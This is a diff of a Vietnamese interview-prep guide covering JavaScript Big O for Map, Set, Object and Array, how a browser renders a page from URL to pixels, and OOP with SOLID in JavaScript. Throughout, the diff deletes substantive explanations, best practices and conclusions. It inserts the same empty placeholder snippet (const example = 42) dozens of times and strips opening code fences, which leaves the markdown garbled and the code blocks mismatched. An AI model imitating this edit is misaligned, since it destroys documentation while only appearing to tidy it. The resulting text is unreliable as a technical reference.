-**🔑 Chi Tiết Từng Cấu Trúc:**
-
-**1. Map/Set - Hash Table (O(1) average):**
-- **Internal**: Hash function → bucket index → direct access
-- **Collision**: Cùng hash → linked list/tree trong bucket
-- **Average O(1)**: Hash function phân bố đều → ít collision
-- **Worst O(n)**: Tất cả keys cùng hash (rất hiếm)
-
-**2. Object - Similar Map (O(1) average):**
-- **Keys**: Chỉ strings/symbols (Map dùng any type)
-- **Property access**: `obj.prop` hoặc `obj['prop']` → O(1)
-- **Search value**: Phải loop `Object.values()` → O(n)
-- **Prototype chain**: Lookup theo chain nếu không có own property
-
-**3. Array - Contiguous Memory (mixed):**
-- **Index access**: `arr[5]` → O(1) (direct memory offset)
-- **Search**: `.indexOf()`, `.includes()` → **O(n)** (linear scan)
-- **Push/pop** (end): O(1) - không shift
-- **Unshift/shift** (start): **O(n)** - phải shift tất cả elements
-- **Splice** (middle): **O(n)** - shift elements sau insertion point
-
-**⚠️ Lỗi Thường Gặp:**
-- Dùng `array.indexOf()` trong loop → O(n²), dùng Set cho O(n)
-- `array.unshift()` nhiều lần → O(n²), dùng `.push()` rồi `.reverse()`
-- Nghĩ Object lookup **luôn O(1)** → Sai! Prototype chain có thể O(k) với k = chain depth
-- Dùng `delete obj.key` trong hot path → deoptimize V8, dùng `obj.key = undefined` thay vì
-
-**💡 Kiến Thức Senior:**
-- **Map vs Object performance**: Map nhanh hơn cho **frequent add/delete** (Object shape changes → deoptimize)
-- **Set for uniqueness**: `[...new Set(arr)]` dedup = O(n), `arr.filter((v,i,a) => a.indexOf(v)===i)` = O(n²)
-- **Sparse arrays**: `arr[1000] = 1` tạo holes → kiểu dữ liệu thay đổi (dictionary mode), chậm hơn
-- **WeakMap/WeakSet**: O(1) nhưng không prevent GC, không iterable
-
-
-
-
-**Trả lời:****
-
-- Khái niệm: Big O notation mô tả hiệu năng thuật toán khi data tăng lên; quan trọng để chọn cấu trúc dữ liệu phù hợp.
-- Map/Set: O(1) average cho get/set/delete nhờ hash table; O(n) worst case khi hash collision nhiều (rất hiếm).
-- Object: O(1) average cho property access; tương tự Map nhưng chỉ key string/symbol.
-- Array: O(1) index access; O(n) search (indexOf, includes); O(n) insert/delete đầu/giữa (phải shift elements).
-
-**Hoạt động Chi Tiết:**
-
-**Map/Set - Tại sao O(1)?**
-
-1. **Hash Function**: Key được hash thành index (0-buckets.length)
-2. **Direct Access**: Truy cập bucket qua index → O(1)
-3. **Collision Handling**: Cùng hash → lưu linked list/tree trong bucket
-4. **Average Case**: Ít collision → O(1); hash tốt phân bố đều
-5. **Worst Case**: Nhiều collision → O(n) (tất cả key cùng bucket)
-
-**Internal Structure:**
-
-```
 Map internal:
 buckets: [
   0: null,
@@ -18997,30 +11369,13 @@ buckets: [
 
 Hash('a') % buckets.length = 1 → bucket[1]
 Hash('x') % buckets.length = 1 → collision → chain với 'a'
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Ưu điểm:**
-
-- Map/Set: O(1) thao tác, key có thể là bất kỳ type, maintain insertion order, có size property
-- Object: Syntax ngắn gọn, JSON serializable, prototype chain
-- Array: O(1) index access, nhiều built-in methods, maintain order
-
-**Nhược điểm:**
-
-- Map/Set: Syntax dài hơn Object, không serialize JSON trực tiếp, tốn memory hơn (hash table overhead)
-- Object: Chỉ string/symbol keys, không có size built-in, có thể bị prototype pollution
-- Array: O(n) search/insert/delete (không phải cuối mảng), memory fragmentation với sparse array
-
-**Chú thích:**
-
-- Dùng Map khi cần key không phải string hoặc thao tác thêm/xóa thường xuyên
-- Dùng Object cho config/options đơn giản
-- Dùng Array khi cần maintain order và iterate nhiều
-- Dùng Set để loại duplicate O(1)
-
-**Code Example:**
-
-```ts
+ts
  // Chú giải: ============================================
  // Chú giải: BIG O COMPARISON TABLE
  // Chú giải: ============================================
@@ -19323,38 +11678,13 @@ hashMap.set('banana', 2);
 hashMap.set('cherry', 3);
 hashMap.visualize();
 // Output sẽ show collision nếu hash('apple') % 8 === hash('banana') % 8
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Best Practices:**
-
-1. **Chọn cấu trúc dữ liệu phù hợp:**
-
-   - Lookup thường xuyên → Map/Object
-   - Check existence → Set
-   - Ordered collection + iterate → Array
-   - Simple config → Object
-
-2. **Performance tips:**
-
-   - Dùng Map thay Array.find() cho lookup nhiều lần
-   - Dùng Set.has() thay Array.includes()
-   - Avoid unshift/shift trong loop → dùng push + reverse
-   - Pre-allocate Array size nếu biết trước: `new Array(1000000)`
-
-3. **Memory consideration:**
-
-   - Map/Set tốn memory hơn (~2x overhead cho hash table)
-   - Sparse array tốn memory thừa
-   - Object có prototype overhead
-
-4. **Hash collision mitigation:**
-   - JS engines tự resize hash table khi load factor cao
-   - Good hash function phân bố đều keys
-   - Modern engines dùng advanced techniques (Robin Hood hashing, etc.)
-
-**Mistakes:**
-
-```ts
+ts
 // ❌ Sai: Dùng Array.find() trong loop → O(n²)
 const users = [
   /* 1M users */
@@ -19396,153 +11726,26 @@ for (let i = 0; i < arr.length; i++) {
 
 // ✅ Đúng: Filter → O(n)
 const filtered = arr.filter((item) => !condition); // Chú giải: O(n)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Kết Luận:**
-
-- **Map/Set O(1)** nhờ hash table: hash key → direct bucket access
-- **Array O(1)** index access nhưng O(n) search/insert/delete
-- **Object O(1)** property access, tương tự Map nhưng key string/symbol only
-- Chọn đúng data structure → performance tăng exponentially (O(n²) → O(n))
----
-## 36. 🌍 Q36: Từ URL đến UI - Quá Trình Browser Render Một Trang Web (Critical Rendering Path)  
-
-**P1: Tên câu hỏi:** 🌍 Q36: Từ URL đến UI - Quá Trình Browser Render Một Trang Web (Critical Rendering Path)  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**
-
-**"Từ URL → UI gồm: Network (DNS, TCP, TLS, HTTP), Parsing (HTML → DOM, CSS → CSSOM), Rendering (Layout, Paint, Composite). Critical Rendering Path optimize = faster First Paint."**
-
-**🔑 12 Bước Chính:**
-
-**PHASE 1: NETWORK (~300-1000ms)**
-
-**1. DNS Lookup** (~20-120ms):
-- Resolve `example.com` → IP address `93.184.216.34`
-- Cache: Browser → OS → Router → ISP DNS
-
-**2. TCP Handshake** (~100-300ms):
-- 3-way: SYN → SYN-ACK → ACK
-- Thiết lập kết nối giữa client-server
-
-**3. TLS Handshake** (~100-300ms - nếu HTTPS):
-- Certificate verification, key exchange
-- Encrypted connection setup
-
-**4. HTTP Request/Response** (~50-500ms):
-- Browser gửi GET request
-- Server return HTML (+ headers: cache, encoding...)
-
-**PHASE 2: PARSING (~50-200ms)**
-
-**5. HTML Parsing → DOM Tree:**
-- Tokenize HTML → parse tags → construct DOM tree
-- **Blocking**: `<script>` without `async/defer`
-
-**6. CSS Parsing → CSSOM Tree:**
-- Parse CSS → compute styles → CSSOM tree
-- **Render-blocking**: CSS blocks rendering
-
-**7. JavaScript Execution:**
-- Parser-blocking: `<script>` stops HTML parsing
-- Execute JS → modify DOM/CSSOM
-- `async` = execute when downloaded, `defer` = execute after DOM
-
-**PHASE 3: RENDERING (~100-500ms)**
-
-**8. Render Tree Construction:**
-- DOM + CSSOM → **Render Tree** (chỉ visible elements)
-- Skip `display:none`, `<head>`, `<script>`
-
-**9. Layout (Reflow):**
-- Tính toán **position & size** của mọi element
-- Output: **Box Model** (width, height, x, y)
-
-**10. Paint:**
-- Tạo **paint records** (fill text, colors, images, borders...)
-- Output: **Paint layers**
-
-**11. Composite:**
-- Kết hợp layers thành final image
-- GPU-accelerated (CSS transforms, opacity)
-
-**12. Display:**
-- Browser hiển thị pixels trên màn hình
-
-**⚠️ Lỗi Thường Gặp:**
-- `<script>` ở `<head>` không `async/defer` → block HTML parsing
-- CSS ở cuối `<body>` → **FOUC** (Flash of Unstyled Content)
-- Large DOM (>1500 nodes) → chậm layout/paint
-- Force sync layout (read `offsetHeight` → modify style → read again) → **layout thrashing**
-
-**💡 Kiến Thức Senior:**
-- **Critical Rendering Path optimization**:
-  - Minimize **render-blocking resources** (inline critical CSS, defer non-critical)
-  - **Preload** key resources: `<link rel="preload" href="font.woff2">`
-  - **HTTP/2 Server Push** critical assets
-- **Metrics**: FCP (First Contentful Paint), LCP (Largest), TTI (Time to Interactive)
-- **`will-change: transform`**: Hint browser tạo composite layer trước (optimize animations)
-- **Resource Hints**: `dns-prefetch`, `preconnect`, `prefetch`, `prerender`
-
-
-
-
-**Trả lời:****
-
-Khi user nhập URL `https://example.com` và nhấn Enter, có **12 bước chính** xảy ra:
-
-**🌐 PHASE 1: NETWORK (Mạng) - Lấy tài nguyên từ server**
-
-1. **DNS Lookup (Tra cứu DNS)** - ~20-120ms
-
-   - Browser kiểm tra DNS cache (browser → OS → router → ISP)
-   - Nếu không có, query DNS server để resolve `example.com` → IP `93.184.216.34`
-   - **Chú thích**: Giống tra số điện thoại trong danh bạ để biết địa chỉ nhà
-
-2. **TCP Handshake (Bắt tay 3 bước)** - ~100-300ms
-
-   - Client gửi `SYN` (synchronize) → Server
-   - Server gửi `SYN-ACK` (acknowledge) → Client
-   - Client gửi `ACK` → Server
-   - **Kết nối TCP được thiết lập**
-   - **Chú thích**: Giống 2 người gọi điện xác nhận nghe thấy nhau trước khi nói chuyện
-
-3. **TLS Handshake (Nếu HTTPS)** - ~100-300ms
-
-   - Client gửi `ClientHello` (supported cipher suites)
-   - Server gửi `ServerHello` + Certificate (SSL cert)
-   - Client verify certificate với CA (Certificate Authority)
-   - Trao đổi keys và thiết lập encrypted connection
-   - **Chú thích**: Giống kiểm tra CMND trước khi chia sẻ thông tin mật
-
-4. **HTTP Request** - ~50-200ms
-
-   ```http
+http
    GET / HTTP/1.1
    Host: example.com
    User-Agent: Chrome/120.0
    Accept: text/html
    Accept-Encoding: gzip, deflate, br
    Cookie: session=abc123
-   ```
 
-   - Browser gửi request lên server
-   - **Chú thích**: Giống bạn yêu cầu món ăn ở nhà hàng
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-5. **Server Processing** - ~100-1000ms
-
-   - Server nhận request
-   - Xử lý logic (query database, run business logic)
-   - Generate HTML response
-   - **Chú thích**: Bếp nấu món ăn bạn yêu cầu
-
-6. **HTTP Response** - ~50-500ms
-
-   ```http
+http
    HTTP/1.1 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Encoding: gzip
@@ -19551,16 +11754,12 @@ Khi user nhập URL `https://example.com` và nhấn Enter, có **12 bước ch�
 
    <!DOCTYPE html>
    <html>...</html>
-   ```
 
-   - Server gửi HTML về browser
-   - **Chú thích**: Món ăn được mang ra bàn
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-**🎨 PHASE 2: PARSING (Phân tích) - Browser xử lý HTML/CSS/JS**
-
-7. **HTML Parsing → DOM Tree** - ~100-500ms
-
-   ```
    HTML: <div><p>Hello</p></div>
 
    DOM Tree:
@@ -19570,84 +11769,56 @@ Khi user nhập URL `https://example.com` và nhấn Enter, có **12 bước ch�
            └── div
                └── p
                    └── "Hello"
-   ```
 
-   - Browser parse HTML từ trên xuống (top-to-bottom)
-   - Tạo **DOM (Document Object Model)** tree
-   - **⚠️ Blocking**: Khi gặp `<script>`, dừng parsing cho đến khi script execute xong
-   - **Chú thích**: Đọc công thức nấu ăn và chuẩn bị nguyên liệu
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-8. **CSS Parsing → CSSOM Tree** - ~50-200ms
-
-   ```
    CSS: div { color: red; }
 
    CSSOM Tree:
    StyleSheet
    └── div
        └── color: red
-   ```
 
-   - Parse `<link>` và `<style>` tags
-   - Tạo **CSSOM (CSS Object Model)** tree
-   - **⚠️ Render-blocking**: Phải đợi tất cả CSS load xong mới render
-   - **Chú thích**: Chuẩn bị gia vị và cách trang trí món ăn
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-9. **JavaScript Execution** - ~100-2000ms
-   ```javascript
+javascript
    // Khi gặp <script src="app.js">
    // 1. Download app.js (nếu external)
  // Chú giải: 2. Parse & Compile JS
    // 3. Execute code (có thể modify DOM/CSSOM)
-   ```
-   - **⚠️ Parser-blocking**: `<script>` chặn HTML parsing
-   - **✅ async/defer**: Không chặn parsing
-     - `async`: Download parallel, execute ngay khi xong (không đảm bảo thứ tự)
-     - `defer`: Download parallel, execute sau khi HTML parse xong (đảm bảo thứ tự)
-   - **Chú thích**: Thêm hành động đặc biệt vào món ăn (vd: flambe)
 
-**🖼️ PHASE 3: RENDERING (Vẽ lên màn hình) - Critical Rendering Path**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-10. **Render Tree Construction** - ~50-200ms
-
-    ```
     DOM + CSSOM → Render Tree
 
     Render Tree chỉ chứa:
-    - Visible elements (không có display: none)
-    - Với computed styles (font, color, position...)
-    ```
+- Visible elements (không có display: none)
+- Với computed styles (font, color, position...)
 
-    - Kết hợp DOM + CSSOM
-    - Loại bỏ invisible nodes (`display: none`, `<head>`, `<script>`)
-    - **Chú thích**: Sắp xếp món ăn lên đĩa theo cách đẹp mắt
-
-11. **Layout (Reflow)** - ~50-500ms
-
-    ```
-    Tính toán:
-    - Vị trí (x, y) của mỗi element
-    - Kích thước (width, height)
-    - Box model (margin, padding, border)
-    ```
-
-    - Browser tính toán **geometry** (hình học) của mỗi element
-    - **⚠️ Expensive**: Thay đổi layout triggers reflow toàn bộ tree
-    - **Chú thích**: Đo kích thước và vị trí từng thành phần trên đĩa
-
-12. **Paint & Composite** - ~50-200ms
-    - **Paint**: Chuyển elements thành pixels (fill colors, draw text, images...)
-    - **Composite**: Kết hợp các layers thành final image
-    - GPU acceleration cho `transform`, `opacity`
-    - **Chú thích**: Vẽ món ăn lên giấy và ghép các lớp lại thành hình hoàn chỉnh
-
-**🎯 Total Time: ~800ms - 5000ms** (phụ thuộc network, server, complexity)
-
-**Hoạt động:**
-
-**📊 Timeline minh họa:**
-
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
+
+    Tính toán:
+- Vị trí (x, y) của mỗi element
+- Kích thước (width, height)
+- Box model (margin, padding, border)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
 Time →  0ms          200ms        400ms        600ms        800ms       1000ms
         │             │            │            │            │            │
 DNS     ████
@@ -19663,71 +11834,25 @@ Layout                                                 ███
 Paint                                                     ██
         │             │            │            │            │            │
         └─ NETWORK ──┴── PARSING ──┴─────────── RENDERING ─────────────┘
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🔥 Critical Rendering Path (Con đường render quan trọng):**
-
-```
 HTML → DOM Tree ─┐
                   ├─→ Render Tree → Layout → Paint → Composite → Display
 CSS → CSSOM Tree ─┘
         ↑
         │
     JS có thể modify DOM/CSSOM (triggering reflow/repaint)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-**Ưu điểm:**
-
-1. **Efficient Pipeline**: Browser optimize mỗi bước để render nhanh nhất
-2. **Progressive Rendering**: Browser render từng phần khi có data (không đợi full page load)
-3. **Caching**: DNS, TCP connections, assets được cache để lần sau nhanh hơn
-4. **Parallel Processing**: Browser download multiple resources đồng thời (HTTP/2, HTTP/3)
-5. **GPU Acceleration**: Dùng GPU cho animations (`transform`, `opacity`) thay vì CPU
-
----
-
-**Nhược điểm:**
-
-1. **Render-blocking CSS**: Phải load hết CSS mới render → tăng FCP (First Contentful Paint)
-2. **Parser-blocking JS**: `<script>` chặn HTML parsing → delay DOM construction
-3. **Network Latency**: Mỗi RTT (Round-Trip Time) thêm ~100-300ms delay
-4. **Reflow/Repaint Expensive**: Thay đổi layout trigger reflow toàn bộ page
-5. **Third-party Scripts**: Ads, analytics làm chậm page load
-
----
-
-**Chú thích:**
-
-**🎯 Các metrics quan trọng (Web Vitals):**
-
-- **FCP (First Contentful Paint)**: Thời gian browser render first content (~1-2s)
-- **LCP (Largest Contentful Paint)**: Thời gian render largest content (~2-3s)
-- **TTI (Time to Interactive)**: Thời gian page có thể tương tác (~3-5s)
-- **CLS (Cumulative Layout Shift)**: Đo lường layout shift (< 0.1 là tốt)
-- **FID (First Input Delay)**: Delay từ khi user click đến khi browser respond (< 100ms)
-
-**⚡ Optimization techniques:**
-
-1. **DNS Prefetch**: `<link rel="dns-prefetch" href=" // Chú giải: api.example.com">`
-2. **Preconnect**: `<link rel="preconnect" href=" // Chú giải: cdn.example.com">`
-3. **Resource Hints**: `<link rel="preload" as="script" href="critical.js">`
-4. **Critical CSS**: Inline critical CSS, defer non-critical
-5. **Async/Defer JS**: `<script async src="analytics.js">`
-6. **Code Splitting**: Load only needed code first
-7. **Image Optimization**: WebP, lazy loading, responsive images
-8. **CDN**: Serve static assets from edge locations closer to users
-9. **HTTP/2 or HTTP/3**: Multiplexing, server push
-10. **Service Worker**: Cache assets for offline/fast subsequent loads
-
----
-
-**Code Example:**
-
-**🔍 Ví dụ 1: Waterfall Network Requests (Sequential loading - SLOW)**
-
-```html
+html
 <!DOCTYPE html>
 <html>
   <head>
@@ -19755,11 +11880,13 @@ Total blocking time: 200 + 300 + 200 = 700ms
 FCP: ~900ms (after styles.css + scripts loaded)
 ❌ User sees blank white screen for ~900ms
 -->
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**✅ Ví dụ 2: Optimized Loading (Parallel + Progressive - FAST)**
-
-```html
+html
 <!DOCTYPE html>
 <html>
   <head>
@@ -19833,11 +11960,13 @@ Images lazy load: không block render
 Scripts defer: download parallel, execute after DOM ready
 ✅ FCP: ~200-400ms (user sees content immediately!)
 -->
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🔍 Ví dụ 3: Measuring Performance với Performance API**
-
-```typescript
+typescript
 // Đo các Web Vitals metrics
 interface PerformanceMetrics {
   dns: number;
@@ -19909,11 +12038,13 @@ window.addEventListener('load', () => {
     */
   }, 0);
 });
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🔍 Ví dụ 4: Tối Ưu Critical Rendering Path trong Trading App**
-
-```typescript
+typescript
  // Chú giải: ❌ BAD: Load tất cả chart libraries upfront
 import { Chart } from 'chart.js'; // Chú giải: 200KB
 import { TradingView } from 'tradingview'; // Chú giải: 500KB
@@ -19998,23 +12129,23 @@ document.head.insertAdjacentHTML(
 /*
 📊 Kết quả:
 ❌ BAD:
-  - Bundle size: 1000KB
-  - FCP: 3-5s
-  - TTI: 5-7s
+- Bundle size: 1000KB
+- FCP: 3-5s
+- TTI: 5-7s
 
 ✅ GOOD:
-  - Initial bundle: 100KB
-  - FCP: 500ms-1s
-  - TTI: 1-2s
-  - Load chart.js khi cần: +200ms
+- Initial bundle: 100KB
+- FCP: 500ms-1s
+- TTI: 1-2s
+- Load chart.js khi cần: +200ms
 */
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-**Best Practices:**
-
-```typescript
+typescript
  // Chú giải: ✅ DO: Optimize Critical Rendering Path
 
  // Chú giải: 1. Minimize Critical Resources
@@ -20070,13 +12201,13 @@ const observer = new PerformanceObserver((list) => {
 });
 
 observer.observe({ entryTypes: ['largest-contentful-paint'] });
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-**Common Mistakes:**
-
-```typescript
+typescript
  // Chú giải: ❌ MISTAKE 1: Render-blocking CSS
 <link rel="stylesheet" href="styles.css">
 // Browser phải download + parse CSS trước khi render bất cứ gì!
@@ -20147,13 +12278,12 @@ getFID(console.log);
 getFCP(console.log);
 getLCP(console.log);
 getTTFB(console.log);
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-**📋 Tóm tắt 12 Bước từ URL → UI:**
-
-```
 1. DNS Lookup       → Resolve domain → IP
 2. TCP Handshake    → Establish connection (SYN, SYN-ACK, ACK)
 3. TLS Handshake    → Secure connection (HTTPS)
@@ -20166,128 +12296,12 @@ getTTFB(console.log);
 10. Render Tree     → DOM + CSSOM = Render Tree
 11. Layout          → Tính toán vị trí & kích thước
 12. Paint+Composite → Vẽ pixels lên màn hình → ✅ USER SEES UI!
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🎯 Critical Rendering Path:** `HTML → DOM + CSS → CSSOM = Render Tree → Layout → Paint`
-
-**⚡ Tối ưu:** Minimize critical resources, reduce bytes, optimize path length!
-
----
----
-## 37. 🏛️ Q37: OOP (Object-Oriented Programming) trong JavaScript - Classes, Inheritance, Encapsulation & SOLID Principles?  
-
-**P1: Tên câu hỏi:** 🏛️ Q37: OOP (Object-Oriented Programming) trong JavaScript - Classes, Inheritance, Encapsulation & SOLID Principles?  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**
-
-**"OOP trong JS bao gồm Classes (ES6 sugar trên prototypes), Encapsulation (#private fields), Inheritance (extends), Polymorphism (override methods), + SOLID principles để thiết kế maintainable code."**
-
-**🔑 5 Pillars của OOP:**
-
-**1. Classes (Lớp):**
-- **Blueprint** để tầo objects: `class User { constructor(name) {...} }`
-- **Syntactic sugar** trên prototype-based inheritance
-- Methods tự động **non-enumerable**, khác function constructors
-
-**2. Encapsulation (Đóng gói):**
-- **Private fields**: `#balance` - truly private (ES2022), không access từ ngoài
-- **Public API**: Chỉ expose cần thiết (`getBalance()`, `deposit()`)
-- Protect implementation details, prevent invalid state
-
-**3. Inheritance (Kế thừa):**
-- `class Admin extends User` - **"is-a" relationship**
-- `super()` bắt buộc trong constructor, `super.method()` gọi parent
-- Prototype chain: `admin.__proto__` → `Admin.prototype` → `User.prototype` → `Object.prototype`
-
-**4. Polymorphism (Đa hình):**
-- **Override methods**: `Admin.login()` khác `User.login()`
-- Cùng interface, behavior khác nhau
-- Duck typing: "If it walks like a duck..."
-
-**5. Composition (Kết hợp):**
-- **"Has-a" relationship** - inject dependencies
-- `class UserService { constructor(logger, db) {...} }`
-- **Prefer over Inheritance** - flexible, loosely coupled
-
-**🔑 SOLID Principles:**
-
-- **S**ingle Responsibility: 1 class = 1 nhiệm vụ
-- **O**pen/Closed: Mở rộng, đóng sửa đổi (extend, không modify existing)
-- **L**iskov Substitution: Subclass thay thế parent không break code
-- **I**nterface Segregation: Nhiều interfaces nhỏ > 1 interface lớn
-- **D**ependency Inversion: Depend on abstractions, not concretions (inject)
-
-**⚠️ Lỗi Thường Gặp:**
-- Quên `super()` trong child constructor → ReferenceError
-- Dùng `_privateField` (convention) như truly private → vẫn access được, dùng `#` thay vì
-- **Deep inheritance chains** (>3 levels) → fragile, hard maintain
-- Pass methods as callbacks không bind `this` → `this` = undefined
-
-**💡 Kiến Thức Senior:**
-- **Composition > Inheritance**: Avoid "gorilla-banana problem" (muốn banana nhưng nhận cả gorilla + jungle)
-- **Mixins**: `Object.assign(MyClass.prototype, Loggable, Serializable)` - multiple behaviors
-- **Static methods** for factories: `User.fromJSON(json)`, `Array.from()`
-- **Private class fields** (#) không inherit (khác public properties)
-- Modern approach: **Functional programming** + **Hooks** (React) thay classes
-
-
-
-
-**Trả lời:****
-OOP (Lập trình Hướng Đối Tượng) là **paradigm lập trình** dựa trên **objects** (đối tượng) chứa:
-
-- **Data** (dữ liệu) → properties/fields (thuộc tính)
-- **Behavior** (hành vi) → methods (phương thức)
-
-JavaScript hỗ trợ OOP thông qua 5 concepts chính:
-
-1. **Classes (Lớp)** - ES6+
-
-   - Là "bản thiết kế" (blueprint) để tạo objects
-   - Syntactic sugar cho prototype-based inheritance
-   - **Ví dụ**: `class User { ... }` → tạo ra nhiều user objects
-
-2. **Encapsulation (Đóng gói)**
-
-   - Ẩn implementation details (chi tiết triển khai) bên trong class
-   - Chỉ expose ra public API cần thiết
-   - Dùng **private fields** (`#fieldName`) để bảo vệ data
-   - **Ví dụ**: `#balance` trong BankAccount không thể truy cập từ bên ngoài
-
-3. **Inheritance (Kế thừa)**
-
-   - Class con (child) kế thừa properties/methods từ class cha (parent)
-   - Tái sử dụng code, tránh duplication
-   - Dùng keyword `extends`
-   - **Ví dụ**: `Admin extends User` → Admin có tất cả methods của User + thêm methods riêng
-
-4. **Polymorphism (Đa hình)**
-
-   - Subclass có thể override (ghi đè) methods của parent
-   - Cùng method name nhưng behavior khác nhau
-   - **Ví dụ**: `Admin.login()` khác `User.login()` (Admin có thêm audit log)
-
-5. **Composition (Kết hợp)**
-   - "Has-a" relationship thay vì "Is-a" (inheritance)
-   - Inject dependencies vào class thay vì kế thừa
-   - **Ưu tiên hơn Inheritance** (Composition > Inheritance)
-   - **Ví dụ**: `UserService` có `logger` và `emailService` (inject vào) thay vì kế thừa từ Logger
-
-**🎯 SOLID Principles (5 nguyên tắc thiết kế OOP):**
-
-- **S**ingle Responsibility: 1 class chỉ làm 1 việc
-- **O**pen/Closed: Mở cho mở rộng, đóng cho sửa đổi
-- **L**iskov Substitution: Subclass thay thế được parent
-- **I**nterface Segregation: Interfaces nhỏ, tập trung
-- **D**ependency Inversion: Phụ thuộc vào abstractions, không phải concretions
-
-**Hoạt động:**
-
-```
 ┌──────────────────────────────────────────────────────────┐
 │              OOP Concepts Flow                           │
 ├──────────────────────────────────────────────────────────┤
@@ -20333,58 +12347,13 @@ JavaScript hỗ trợ OOP thông qua 5 concepts chính:
 │  │ }                                   │                │
 │  └─────────────────────────────────────┘                │
 └──────────────────────────────────────────────────────────┘
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Ưu điểm:**
-
-1. **✅ Code Reusability (Tái sử dụng Code)**
-
-   - **Giải thích**: Inheritance cho phép class con kế thừa tất cả properties/methods từ class cha
-   - **Lợi ích**: Không phải viết lại code → giảm duplication, dễ maintain
-   - **Ví dụ**:
-     - `Admin extends User` → Admin có sẵn `login()`, `logout()` từ User
-     - Chỉ cần viết thêm methods riêng như `deleteUser()`, `manageRoles()`
-   - **Thực tế**:
-     - Base class `Animal` có `eat()`, `sleep()`
-     - `Dog`, `Cat`, `Bird` đều kế thừa → không viết lại 3 lần
-
-2. **✅ Maintainability (Dễ Bảo trì)**
-
-   - **Giải thích**: Encapsulation (đóng gói) ẩn implementation details, chỉ expose public API
-   - **Lợi ích**:
-     - Thay đổi internal logic không ảnh hưởng code bên ngoài
-     - Tách biệt concerns (data vs behavior)
-     - Dễ refactor
-   - **Ví dụ**:
-     - `#balance` trong BankAccount là private → thay đổi cách tính balance không ảnh hưởng caller
-     - External code chỉ gọi `getBalance()` (stable API)
-   - **Thực tế**:
-     - Sửa validation logic trong `UserValidator` → không ảnh hưởng `UserService`
-     - Thay database trong `UserRepository` → không ảnh hưởng business logic
-
-3. **✅ Scalability (Khả năng Mở rộng)**
-
-   - **Giải thích**: Dễ dàng thêm tính năng mới qua subclasses hoặc composition
-   - **Lợi ích**:
-     - Extend functionality mà không sửa code cũ (Open/Closed Principle)
-     - Thêm classes mới độc lập
-   - **Ví dụ**:
-     - Có `PaymentMethod` abstract → thêm `MomoPayment`, `ZaloPayPayment` dễ dàng
-     - Không cần sửa code xử lý payment hiện tại
-   - **Thực tế**:
-     - E-commerce có `StandardShipping` → thêm `ExpressShipping`, `SameDayShipping`
-     - Trading system có `MarketOrder` → thêm `LimitOrder`, `StopLossOrder`
-
-4. **✅ Type Safety (An toàn Kiểu)**
-
-   - **Giải thích**: TypeScript interfaces/abstract classes enforce contracts, catch errors at compile-time
-   - **Lợi ích**:
-     - IDE autocomplete đầy đủ
-     - Catch errors trước khi run code
-     - Documentation tự động qua types
-   - **Ví dụ**:
-
-     ```typescript
+typescript
      interface ILogger {
        log(message: string): void; // Chú giải: Contract
      }
@@ -20394,66 +12363,38 @@ JavaScript hỗ trợ OOP thông qua 5 concepts chính:
      }
 
      new Service(123); // ❌ Error: 123 không phải ILogger
-     ```
 
-   - **Thực tế**:
-     - `UserService` require `ILogger` → không thể pass `string` hay `number`
-     - Refactor method signature → TypeScript báo lỗi tất cả nơi gọi
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-5. **✅ Testability (Dễ Kiểm thử)**
-
-   - **Giải thích**: Dependency Injection với composition cho phép inject mocks khi test
-   - **Lợi ích**:
-     - Test isolated (không phụ thuộc external services)
-     - Fast (không call API/database thật)
-     - Predictable (mock return cố định)
-   - **Ví dụ**:
-
-     ```typescript
+typescript
  // Chú giải: Production
      const service = new UserService(new RealLogger(), new RealEmailService());
 
  // Chú giải: Testing
      const service = new UserService(new MockLogger(), new MockEmailService());
-     ```
 
-   - **Thực tế**:
-     - Test `TradingService` với mock `OrderExecutor` → không gửi lệnh thật lên sàn
-     - Test `PaymentService` với mock `PaymentGateway` → không charge tiền thật
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-**Nhược điểm:**
-
-1. **❌ Over-Engineering (Thiết kế Quá phức tạp)**
-
-   - **Giải thích**: Inheritance hierarchy quá sâu (nhiều tầng kế thừa) → khó hiểu, khó maintain
-   - **Vấn đề**:
-     - Phải đọc nhiều classes để hiểu logic
-     - Khó trace method được gọi từ đâu
-     - Thêm tính năng mới phải hiểu cả hierarchy
-   - **Ví dụ BAD**:
-     ```typescript
+typescript
      class Animal {}
      class Mammal extends Animal {}
      class Carnivore extends Mammal {}
      class Feline extends Carnivore {}
      class Cat extends Feline {}
      class PersianCat extends Cat {} // QUÁ SÂU! 6 tầng
-     ```
-   - **Vấn đề thực tế**:
-     - Sửa `Animal` → phải test lại 5 classes con
-     - Thêm method trong `Mammal` → có thể break `PersianCat`
-   - **Giải pháp**: Giới hạn 2-3 tầng, prefer composition
 
-2. **❌ Tight Coupling (Liên kết Chặt chẽ)**
+```js
